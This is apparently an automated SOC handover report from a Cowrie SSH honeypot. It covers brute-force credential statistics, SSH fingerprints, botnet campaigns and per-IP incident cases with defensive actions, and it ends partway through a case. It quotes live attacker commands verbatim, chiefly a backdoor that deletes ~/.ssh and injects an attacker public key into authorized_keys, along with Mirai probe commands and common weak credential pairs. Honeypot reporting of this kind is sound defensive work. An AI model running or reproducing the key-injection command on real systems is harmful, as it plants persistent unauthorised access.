# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-03 |
| **Generated At** | 2026-07-03T23:09:13Z |
| **Shift Time** | 23:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **267** |
| Confirmed Threats | **209** |
| False Positives Filtered | **58** (21.7%) |
| Unique Attacker IPs | **50** |
| Countries of Origin | **17** |
| High Severity Cases | **90** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **177** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **94** |
| Unique Credential Pairs | **47** |
| Unique Usernames | **15** |
| Unique Passwords | **43** |
| Successful Auth Pairs | **86** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `345gs5662d34` | 16 |
| `support` | 6 |
| `ubuntu` | 4 |
| `GET / HTTP/1.1` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `support` | 6 |
| `LeitboGi0ro` | 5 |
| `smo@@kkklss` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 12 |
| `support` | `support` | 6 |
| `root` | `LeitboGi0ro` | 5 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qa2ws#ED$RF` | `49.231.192.36` | 2026-07-03T21:01:19 |
| `345gs5662d34` | `345gs5662d34` | `49.231.192.36` | 2026-07-03T21:01:25 |
| `root` | `3245gs5662d34` | `49.231.192.36` | 2026-07-03T21:01:28 |
| `root` | `Fs@123456` | `218.0.56.30` | 2026-07-03T21:05:12 |
| `345gs5662d34` | `345gs5662d34` | `218.0.56.30` | 2026-07-03T21:05:16 |
| `root` | `3245gs5662d34` | `218.0.56.30` | 2026-07-03T21:05:17 |
| `ubuntu` | `demo12` | `45.198.224.120` | 2026-07-03T21:06:24 |
| `root` | `Z!x2c3v4` | `103.165.227.178` | 2026-07-03T21:06:35 |
| `345gs5662d34` | `345gs5662d34` | `103.165.227.178` | 2026-07-03T21:06:40 |
| `root` | `3245gs5662d34` | `103.165.227.178` | 2026-07-03T21:06:42 |
| `support` | `support` | `176.53.159.196` | 2026-07-03T21:06:43 |
| `support` | `support` | `10.0.0.73` | 2026-07-03T21:08:00 |
| `root` | `qwqwqwqw1` | `207.154.250.9` | 2026-07-03T21:08:08 |
| `345gs5662d34` | `345gs5662d34` | `207.154.250.9` | 2026-07-03T21:08:10 |
| `root` | `3245gs5662d34` | `207.154.250.9` | 2026-07-03T21:08:11 |
| `server` | `qwe123` | `121.132.27.238` | 2026-07-03T21:10:50 |
| `345gs5662d34` | `345gs5662d34` | `121.132.27.238` | 2026-07-03T21:10:54 |
| `server` | `3245gs5662d34` | `121.132.27.238` | 2026-07-03T21:10:56 |
| `ubuntu` | `abcd-1234` | `45.198.224.120` | 2026-07-03T21:18:23 |
| `test123` | `test@123` | `103.97.101.25` | 2026-07-03T21:23:12 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-07-03T21:23:16 |
| `test123` | `3245gs5662d34` | `103.97.101.25` | 2026-07-03T21:23:18 |
| `root` | `Tj123456.` | `34.142.110.144` | 2026-07-03T21:23:40 |
| `345gs5662d34` | `345gs5662d34` | `34.142.110.144` | 2026-07-03T21:23:42 |
| `root` | `3245gs5662d34` | `34.142.110.144` | 2026-07-03T21:23:43 |
| `root` | `9876` | `103.190.214.241` | 2026-07-03T21:23:49 |
| `345gs5662d34` | `345gs5662d34` | `103.190.214.241` | 2026-07-03T21:23:53 |
| `support` | `support` | `176.53.159.198` | 2026-07-03T21:23:54 |
| `root` | `3245gs5662d34` | `103.190.214.241` | 2026-07-03T21:23:55 |
| `client` | `Client123` | `185.242.3.195` | 2026-07-03T21:29:54 |
| `root` | `Password!12345` | `45.198.224.120` | 2026-07-03T21:30:12 |
| `root` | `He123456@` | `125.244.114.221` | 2026-07-03T21:32:23 |
| `345gs5662d34` | `345gs5662d34` | `125.244.114.221` | 2026-07-03T21:32:27 |
| `root` | `3245gs5662d34` | `125.244.114.221` | 2026-07-03T21:32:28 |
| `root` | `Ai123456.` | `163.7.12.183` | 2026-07-03T21:32:44 |
| `345gs5662d34` | `345gs5662d34` | `163.7.12.183` | 2026-07-03T21:32:48 |
| `root` | `3245gs5662d34` | `163.7.12.183` | 2026-07-03T21:32:50 |
| `test1234` | `test1234` | `202.51.214.98` | 2026-07-03T21:35:01 |
| `345gs5662d34` | `345gs5662d34` | `202.51.214.98` | 2026-07-03T21:35:05 |
| `test1234` | `3245gs5662d34` | `202.51.214.98` | 2026-07-03T21:35:07 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.190` | 2026-07-03T21:39:53 |
| `ubuntu` | `qwerty123` | `45.198.224.120` | 2026-07-03T21:42:13 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.34.173.23` | 2026-07-03T21:44:46 |
| `*1` | `$4` | `34.34.173.23` | 2026-07-03T21:44:55 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2228` | `34.34.173.23` | 2026-07-03T21:44:57 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-03T21:48:25 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-03T21:48:25 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-03T21:48:33 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-03T21:52:35 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-03T21:52:35 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-03T21:52:41 |
| `dell` | `1qaz2wsx` | `45.198.224.120` | 2026-07-03T21:54:01 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.195.32.146` | 2026-07-03T21:58:03 |
| `*1` | `$4` | `35.195.32.146` | 2026-07-03T21:58:17 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8581` | `35.195.32.146` | 2026-07-03T21:58:19 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-03T22:01:42 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-03T22:01:43 |
| `root` | `root@2024` | `103.67.162.139` | 2026-07-03T22:04:14 |
| `345gs5662d34` | `345gs5662d34` | `103.67.162.139` | 2026-07-03T22:04:18 |
| `root` | `3245gs5662d34` | `103.67.162.139` | 2026-07-03T22:04:20 |
| `root` | `rainbow` | `45.198.224.120` | 2026-07-03T22:05:46 |
| `client` | `Client123` | `10.0.0.73` | 2026-07-03T22:10:00 |
| `root` | `123root123` | `45.198.224.120` | 2026-07-03T22:17:31 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.38.159.252` | 2026-07-03T22:21:17 |
| `*1` | `$4` | `34.38.159.252` | 2026-07-03T22:21:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8332` | `34.38.159.252` | 2026-07-03T22:21:33 |
| `webalizer` | `webalizer` | `118.33.113.4` | 2026-07-03T22:26:45 |
| `345gs5662d34` | `345gs5662d34` | `118.33.113.4` | 2026-07-03T22:26:49 |
| `webalizer` | `3245gs5662d34` | `118.33.113.4` | 2026-07-03T22:26:50 |
| `AdminGPON` | `ALC#FGU` | `154.90.70.69` | 2026-07-03T22:27:57 |
| `office` | `office` | `45.198.224.120` | 2026-07-03T22:29:28 |
| `root` | `qwe!@#asd` | `115.68.208.117` | 2026-07-03T22:31:38 |
| `345gs5662d34` | `345gs5662d34` | `115.68.208.117` | 2026-07-03T22:31:42 |
| `root` | `3245gs5662d34` | `115.68.208.117` | 2026-07-03T22:31:43 |
| `root` | `qwe!@#asd` | `118.193.39.103` | 2026-07-03T22:39:25 |
| `345gs5662d34` | `345gs5662d34` | `118.193.39.103` | 2026-07-03T22:39:29 |
| `root` | `3245gs5662d34` | `118.193.39.103` | 2026-07-03T22:39:31 |
| `root` | `admin3` | `45.198.224.120` | 2026-07-03T22:41:09 |
| `root` | `QwErTy` | `81.177.101.45` | 2026-07-03T22:41:54 |
| `345gs5662d34` | `345gs5662d34` | `81.177.101.45` | 2026-07-03T22:41:57 |
| `root` | `3245gs5662d34` | `81.177.101.45` | 2026-07-03T22:41:58 |
| `root` | `admin666` | `106.12.241.195` | 2026-07-03T22:43:01 |
| `root` | `123` | `172.210.53.225` | 2026-07-03T22:47:37 |
| `root` | `abc123123@` | `106.12.241.195` | 2026-07-03T22:48:56 |
| `ubuntu` | `test123456` | `45.198.224.120` | 2026-07-03T22:52:51 |
| `root` | `Asdf@1234` | `106.12.241.195` | 2026-07-03T22:53:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **267** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |
| Go SSH scanner | 16 |
| Paramiko (Python) | 12 |
| Generic SSH/2.0 | 1 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 46 | 16 |
| `16443846184e...` | Generic scanner | 13 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `af8223ac9914...` | libssh-based | 6 | 2 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 46 | 16 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `af8223ac9914...` | libssh | 6 | 2 | libssh-based |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `2a86d5946159...` | Generic SSH/2.0 | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 16 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
uname -h
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `154.90.70.69`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.33.113.4`, `218.0.56.30`, `103.165.227.178`, `103.190.214.241`, `103.67.162.139`, `207.154.250.9`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **50** |
| Unique ASNs | **36** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 7 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS154383` | ZORNTECH WEB SOLUTIONS | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (89)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-086b0d6a3998

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-07-03 21:01 |
| **Last Seen** | 2026-07-03 21:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:01:16` | `cowrie.session.connect` |
| `2026-07-03 21:01:16` | `cowrie.client.version` |
| `2026-07-03 21:01:17` | `cowrie.client.kex` |
| `2026-07-03 21:01:19` | `cowrie.login.success` |
| `2026-07-03 21:01:20` | `cowrie.session.params` |
| `2026-07-03 21:01:20` | `cowrie.command.input` |
| `2026-07-03 21:01:20` | `cowrie.command.failed` |
| `2026-07-03 21:01:21` | `cowrie.log.closed` |
| `2026-07-03 21:01:22` | `cowrie.session.params` |
| `2026-07-03 21:01:22` | `cowrie.command.input` |
| `2026-07-03 21:01:22` | `cowrie.session.file_download` |
| `2026-07-03 21:01:22` | `cowrie.log.closed` |
| `2026-07-03 21:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ccf29c1afe

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-07-03 21:01 |
| **Last Seen** | 2026-07-03 21:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:01:23` | `cowrie.session.connect` |
| `2026-07-03 21:01:23` | `cowrie.client.version` |
| `2026-07-03 21:01:23` | `cowrie.client.kex` |
| `2026-07-03 21:01:25` | `cowrie.login.success` |
| `2026-07-03 21:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790f3c726f4c

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-07-03 21:01 |
| **Last Seen** | 2026-07-03 21:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:01:26` | `cowrie.session.connect` |
| `2026-07-03 21:01:26` | `cowrie.client.version` |
| `2026-07-03 21:01:26` | `cowrie.client.kex` |
| `2026-07-03 21:01:28` | `cowrie.login.success` |
| `2026-07-03 21:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ad5dd318c0

| Field | Detail |
|---|---|
| **Source IP** | `218.0.56[.]30` |
| **First Seen** | 2026-07-03 21:05 |
| **Last Seen** | 2026-07-03 21:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:05:11` | `cowrie.session.connect` |
| `2026-07-03 21:05:11` | `cowrie.client.version` |
| `2026-07-03 21:05:11` | `cowrie.client.kex` |
| `2026-07-03 21:05:12` | `cowrie.login.success` |
| `2026-07-03 21:05:13` | `cowrie.session.params` |
| `2026-07-03 21:05:13` | `cowrie.command.input` |
| `2026-07-03 21:05:13` | `cowrie.command.failed` |
| `2026-07-03 21:05:13` | `cowrie.log.closed` |
| `2026-07-03 21:05:14` | `cowrie.session.params` |
| `2026-07-03 21:05:14` | `cowrie.command.input` |
| `2026-07-03 21:05:14` | `cowrie.session.file_download` |
| `2026-07-03 21:05:14` | `cowrie.log.closed` |
| `2026-07-03 21:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.0.56[.]30` to AbuseIPDB if not already reported
- [ ] Block `218.0.56[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda3383f243e

| Field | Detail |
|---|---|
| **Source IP** | `218.0.56[.]30` |
| **First Seen** | 2026-07-03 21:05 |
| **Last Seen** | 2026-07-03 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:05:14` | `cowrie.session.connect` |
| `2026-07-03 21:05:14` | `cowrie.client.version` |
| `2026-07-03 21:05:15` | `cowrie.client.kex` |
| `2026-07-03 21:05:16` | `cowrie.login.success` |
| `2026-07-03 21:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.0.56[.]30` to AbuseIPDB if not already reported
- [ ] Block `218.0.56[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e808080ac1da

| Field | Detail |
|---|---|
| **Source IP** | `218.0.56[.]30` |
| **First Seen** | 2026-07-03 21:05 |
| **Last Seen** | 2026-07-03 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:05:16` | `cowrie.session.connect` |
| `2026-07-03 21:05:16` | `cowrie.client.version` |
| `2026-07-03 21:05:16` | `cowrie.client.kex` |
| `2026-07-03 21:05:17` | `cowrie.login.success` |
| `2026-07-03 21:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.0.56[.]30` to AbuseIPDB if not already reported
- [ ] Block `218.0.56[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97df543a1099

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 21:06 |
| **Last Seen** | 2026-07-03 21:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:06:17` | `cowrie.session.connect` |
| `2026-07-03 21:06:18` | `cowrie.client.version` |
| `2026-07-03 21:06:18` | `cowrie.client.kex` |
| `2026-07-03 21:06:24` | `cowrie.login.success` |
| `2026-07-03 21:06:28` | `cowrie.session.params` |
| `2026-07-03 21:06:28` | `cowrie.command.input` |
| `2026-07-03 21:06:29` | `cowrie.log.closed` |
| `2026-07-03 21:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60905351b7e2

| Field | Detail |
|---|---|
| **Source IP** | `103.165.227[.]178` |
| **First Seen** | 2026-07-03 21:06 |
| **Last Seen** | 2026-07-03 21:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:06:34` | `cowrie.session.connect` |
| `2026-07-03 21:06:34` | `cowrie.client.version` |
| `2026-07-03 21:06:34` | `cowrie.client.kex` |
| `2026-07-03 21:06:35` | `cowrie.login.success` |
| `2026-07-03 21:06:37` | `cowrie.session.params` |
| `2026-07-03 21:06:37` | `cowrie.command.input` |
| `2026-07-03 21:06:37` | `cowrie.command.failed` |
| `2026-07-03 21:06:37` | `cowrie.log.closed` |
| `2026-07-03 21:06:38` | `cowrie.session.params` |
| `2026-07-03 21:06:38` | `cowrie.command.input` |
| `2026-07-03 21:06:38` | `cowrie.session.file_download` |
| `2026-07-03 21:06:38` | `cowrie.log.closed` |
| `2026-07-03 21:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.165.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.165.227[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0f8fdc7e5b

| Field | Detail |
|---|---|
| **Source IP** | `103.165.227[.]178` |
| **First Seen** | 2026-07-03 21:06 |
| **Last Seen** | 2026-07-03 21:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:06:38` | `cowrie.session.connect` |
| `2026-07-03 21:06:38` | `cowrie.client.version` |
| `2026-07-03 21:06:39` | `cowrie.client.kex` |
| `2026-07-03 21:06:40` | `cowrie.login.success` |
| `2026-07-03 21:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.165.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.165.227[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5229f5ba8d11

| Field | Detail |
|---|---|
| **Source IP** | `103.165.227[.]178` |
| **First Seen** | 2026-07-03 21:06 |
| **Last Seen** | 2026-07-03 21:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:06:40` | `cowrie.session.connect` |
| `2026-07-03 21:06:40` | `cowrie.client.version` |
| `2026-07-03 21:06:40` | `cowrie.client.kex` |
| `2026-07-03 21:06:42` | `cowrie.login.success` |
| `2026-07-03 21:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.165.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.165.227[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02cfc3e397c6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 21:06 |
| **Last Seen** | 2026-07-03 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:06:43` | `cowrie.session.connect` |
| `2026-07-03 21:06:43` | `cowrie.client.version` |
| `2026-07-03 21:06:43` | `cowrie.client.kex` |
| `2026-07-03 21:06:43` | `cowrie.login.success` |
| `2026-07-03 21:06:43` | `cowrie.direct-tcpip.request` |
| `2026-07-03 21:06:44` | `cowrie.direct-tcpip.data` |
| `2026-07-03 21:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b4a9b8ba3a7

| Field | Detail |
|---|---|
| **Source IP** | `207.154.250[.]9` |
| **First Seen** | 2026-07-03 21:08 |
| **Last Seen** | 2026-07-03 21:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
